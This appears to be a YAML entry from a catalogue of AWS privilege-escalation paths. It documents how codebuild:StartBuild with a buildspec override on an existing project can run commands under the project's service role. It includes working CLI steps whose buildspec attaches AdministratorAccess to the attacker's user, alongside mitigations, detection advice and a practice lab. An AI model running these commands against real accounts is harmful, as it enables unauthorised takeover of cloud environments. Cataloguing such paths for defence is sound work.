id: codebuild-002
name: codebuild:StartBuild
category: existing-passrole
services:
- codebuild
- iam
description: A principal with `codebuild:StartBuild` can exploit an existing CodeBuild
  project that has a privileged service role by using the `--buildspec-override` parameter
  to execute arbitrary commands with elevated permissions. Unlike the PassRole+CreateProject
  attack, this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions.
  The attacker can replace the project's buildspec with malicious commands that execute
  with the project's service role permissions, potentially achieving administrative
  access if the role is sufficiently privileged.
prerequisites:
  admin:
  - A CodeBuild project must already exist in the account
  - The existing project must have a service role with administrative permissions
    (e.g., AdministratorAccess or an equivalent custom policy)
  - The project must allow buildspec overrides (default behavior unless explicitly
    disabled)
  lateral:
  - A CodeBuild project must already exist in the account
  - The existing project must have a service role with any level of permissions
  - The project must allow buildspec overrides (default behavior unless explicitly
    disabled)
exploitationSteps:
  awscli:
  - step: 1
    command: aws codebuild list-projects --region us-east-1
    description: Discover existing CodeBuild projects in the account (optional but
      helpful for reconnaissance)
  - step: 2
    command: aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region
      us-east-1
    description: Inspect the project details to identify the service role ARN and
      verify it has elevated permissions (optional but helpful)
  - step: 3
    command: "aws codebuild start-build \\\n  --project-name EXISTING_PROJECT_NAME\
      \ \\\n  --region us-east-1 \\\n  --buildspec-override \"version: 0.2\nphases:\n\
      \  build:\n    commands:\n      - echo 'Starting privilege escalation...'\n\
      \      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\
      \      - echo 'Successfully attached AdministratorAccess policy'\"\n"
    description: Start a build with a malicious buildspec that executes with the project's
      privileged service role. This example attaches AdministratorAccess to your user
      account.
  - step: 4
    command: aws codebuild batch-get-builds --ids BUILD_ID --region us-east-1
    description: Monitor the build status to confirm it completed successfully
  - step: 5
    command: aws iam list-users --max-items 3
    description: Verify administrative access was successfully obtained (wait 15-30
      seconds for IAM propagation)
limitations: 'This path provides administrative access only if the existing CodeBuild
  project''s service role has administrative permissions (e.g., AdministratorAccess
  or an equivalent custom policy). If the project only has limited permissions, you
  gain access limited to those permissions. However, even limited access may enable
  multi-hop privilege escalation attacks.

  '
recommendation: "Restrict `codebuild:StartBuild` permission using resource-based constraints:\n\
  \n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"codebuild:StartBuild\",\n\
  \  \"Resource\": \"arn:aws:codebuild:*:ACCOUNT_ID:project/specific-safe-project\"\
  \n}\n```\n\nAdditional security controls:\n- **Least Privilege Service Roles**:\
  \ Ensure CodeBuild service roles follow least privilege principles and cannot modify\
  \ IAM permissions\n- **Disable Buildspec Override**: For projects with privileged\
  \ roles, disable buildspec overrides in the project configuration\n- **CloudTrail\
  \ Monitoring**: Alert on `StartBuild` API calls with buildspec overrides, especially\
  \ on projects with privileged roles\n- **Monitor IAM Changes**: Alert on `AttachUserPolicy`,\
  \ `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls originating from\
  \ CodeBuild service principals\n- **Service Control Policies**: Implement SCPs to\
  \ prevent CodeBuild service roles from modifying IAM policies\n- **IAM Access Analyzer**:\
  \ Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild\
  \ projects\n- **Regular Audits**: Review CodeBuild projects to identify those with\
  \ privileged service roles and restrict access accordingly\n- **Separation of Concerns**:\
  \ Avoid attaching administrative roles to CodeBuild projects; use least-privilege\
  \ roles specific to build requirements\n"
discoveryAttribution:
  firstDocumented:
    author: Erik Steringer
    organization: NCC Group
    date: 2019
    link: https://github.com/nccgroup/PMapper
  derivativeOf:
    pathId: codebuild-001
    modification: Uses buildspec-override on existing CodeBuild project instead of
      creating a new project with PassRole
references:
- title: HackTricks - AWS - Codebuild Privesc
  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc/index.html#codebuildstartbuild--codebuildstartbuildbatch
relatedPaths:
- codebuild-001
- iam-001
- iam-002
detectionTools:
  pmapper: https://github.com/nccgroup/PMapper/blob/91d2e60102bdadf346d77b60d90ddaa4a678f037/principalmapper/graphing/codebuild_edges.py#L165-L173
learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: privesc-one-hop/to-admin/codebuild-startbuild
    description: Deploy Terraform into your own AWS account to practice this attack
      path
toolSupport:
  pmapper: false
  iamVulnerable: false
  pacu: false
  prowler: false
permissions:
  required:
  - permission: codebuild:StartBuild
    resourceConstraints: Must have permission to start builds on the target CodeBuild
      project
  additional:
  - permission: codebuild:ListProjects
    resourceConstraints: Helpful for discovering existing CodeBuild projects with
      privileged roles
  - permission: codebuild:BatchGetProjects
    resourceConstraints: Useful for viewing project details including service role
      ARN and permissions
  - permission: codebuild:BatchGetBuilds
    resourceConstraints: Helpful for monitoring build execution status and verifying
      successful exploitation
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: 'The starting principal (user or role) with `codebuild:StartBuild`
      permission. This principal can trigger builds on existing CodeBuild projects
      and override the buildspec with malicious code. Unlike the PassRole+CreateProject
      attack, this path does NOT require `iam:PassRole` or `codebuild:CreateProject`
      permissions.

      '
  - id: codebuild_project
    label: Existing CodeBuild Project
    type: resource
    description: 'An existing CodeBuild project with a privileged service role. The
      project must allow buildspec overrides (default behavior unless explicitly disabled).
      When a build is started with `--buildspec-override`, the project executes the
      attacker''s malicious buildspec commands with the permissions of the project''s
      service role.

      '
  - id: service_role
    label: CodeBuild Service Role
    type: principal
    description: 'The IAM role attached to the CodeBuild project as its service role.
      When the build executes, CodeBuild automatically assumes this role and makes
      its credentials available to the build environment. The build commands execute
      with all permissions granted to this service role. This role must trust codebuild.amazonaws.com
      in its trust policy.

      '
  - id: execute_buildspec
    label: Execute malicious buildspec
    type: payload
    color: '#99ccff'
    description: 'The CodeBuild project executes the attacker''s malicious buildspec
      commands during the build phase. The buildspec can contain arbitrary shell commands
      that execute with the project''s service role permissions. Common privilege
      escalation techniques include attaching administrator policies to the starting
      principal, creating new access keys, or modifying IAM policies.

      '
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: 'If the CodeBuild project''s service role has administrative permissions
      (AdministratorAccess or equivalent), the attacker gains full administrative
      access to the AWS account. The malicious buildspec can directly modify IAM to
      grant the starting principal admin access or exfiltrate admin credentials.

      '
  - id: partial_outcome
    label: Some additional access
    type: outcome
    color: '#ffeb99'
    description: 'If the CodeBuild project''s service role has elevated but non-administrative
      permissions, the attacker gains partial privilege escalation. This could include
      access to sensitive data stores (S3, RDS, DynamoDB, Secrets Manager), the ability
      to modify other resources, or permissions that enable additional privilege escalation
      paths.

      '
  - id: minimal_outcome
    label: No additional access
    type: outcome
    color: '#cccccc'
    description: 'If the CodeBuild project''s service role only has minimal permissions
      (e.g., basic ECR/S3 access for build artifacts), the privilege escalation may
      not yield meaningful additional access. However, the attacker still gains code
      execution capability which could be useful for reconnaissance or as part of
      a multi-step attack.

      '
  edges:
  - from: start
    to: codebuild_project
    label: codebuild:StartBuild with buildspec-override
    description: "The attacker starts a build on the target CodeBuild project using\
      \ the `--buildspec-override` parameter to inject malicious buildspec content.\
      \ This replaces the project's configured buildspec for this specific build execution.\n\
      \nCommand:\n```bash\naws codebuild start-build \\\n  --project-name EXISTING_PROJECT_NAME\
      \ \\\n  --region us-east-1 \\\n  --buildspec-override \"version: 0.2\nphases:\n\
      \  build:\n    commands:\n      - echo 'Starting privilege escalation...'\n\
      \      - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\
      \      - echo 'Successfully attached AdministratorAccess policy'\"\n```\n\n\
      The malicious buildspec is now queued for execution with the project's service\
      \ role permissions.\n"
  - from: codebuild_project
    to: service_role
    label: Build assumes service role
    description: 'When the CodeBuild build starts, the CodeBuild service automatically
      assumes the project''s service role. The role''s temporary credentials are made
      available to the build environment through the AWS SDK and CLI, allowing any
      commands in the buildspec to execute with the service role''s permissions.

      '
  - from: service_role
    to: execute_buildspec
    label: Execute buildspec commands
    description: 'The build environment executes the commands defined in the malicious
      buildspec with the service role''s credentials. These commands can perform any
      AWS API calls that the service role has permission to execute, including IAM
      modifications if the role has sufficient privileges.


      The attacker can monitor build progress:

      ```bash

      aws codebuild batch-get-builds --ids BUILD_ID --region us-east-1

      ```


      Build logs in CloudWatch Logs show command output, including any privilege escalation
      results.

      '
  - from: execute_buildspec
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: 'If the CodeBuild project''s service role has AdministratorAccess
      or equivalent administrative permissions, the malicious buildspec commands can
      grant the starting principal full administrative access. Common techniques include
      attaching the AdministratorAccess policy, creating admin access keys, or adding
      the principal to an admin group.

      '
  - from: execute_buildspec
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: 'If the CodeBuild project''s service role has elevated but non-administrative
      permissions, the attacker gains partial privilege escalation. The buildspec
      should be tailored to the available permissions - for example, exfiltrating
      secrets from Secrets Manager, accessing S3 data, or pursuing additional privilege
      escalation paths if IAM read permissions exist.

      '
  - from: execute_buildspec
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: 'If the CodeBuild project''s service role only has minimal permissions
      (typically just ECR pull, S3 artifact access, and CloudWatch Logs), the privilege
      escalation may not provide meaningful additional access. However, code execution
      capability and build environment access could still be useful for reconnaissance.

      '
